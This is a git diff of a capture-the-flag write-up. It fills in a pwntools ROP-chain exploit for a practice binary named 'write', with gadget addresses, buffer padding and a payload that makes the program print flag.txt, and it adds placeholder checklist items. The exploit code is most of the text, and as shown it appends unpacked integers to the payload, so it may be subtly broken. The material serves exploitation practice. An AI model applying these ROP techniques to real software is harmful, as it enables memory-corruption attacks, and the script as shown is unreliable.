@@ -193,13 +193,13 @@ print(flag)                           # print flag!
 > ## 2. Solution
 >>
 >>
->> - [ ] 
+>> - [ ] Place hold
 >>>
 >>>
->> - [ ]
+>> - [ ] Place Hold
 >>>
 >>>
->> - [ ]
+>> - [ ] Place hold
 >>>
 >>>
 
@@ -212,13 +212,13 @@ from pwn import *
 elf = context.binary = ELF('write')  # setting up the envronment
 context.log_level = 'debug'       
 
-padding = cyclic(40)
-rop1 = 
-rop2 = 
-move_addr = 
-addr_location = 
-print_file = 
-string =
+padding = cyclic(40)                 # junk to fill up buffer
+rop1 = (0x400690)                    # pop r14; pop r15; ret;
+rop2 = (0x400693)                    # pop rdi; ret;
+move_addr = (0x400628)               # move qword [r14], r15
+addr_location = (0x601028)           # start of .data memory section
+print_file = (0x400510)              # plt address of print_file function
+string = 'flag.txt'                  # string to be placed @ start of .data section
 
 payload = padding                    # start of ROP Chain
 payload += rop1
@@ -232,8 +232,8 @@ payload += print_file                # end of ROP chain
 io = process(elf.path)
 io.sendline(payload)                 # sends payload
 io.wait_for_close()                  
-flag = io.recvall()
-print(flag)
+flag = io.recvall()                  # receive output
+print(flag)                          # print output
 
 ~~~
 
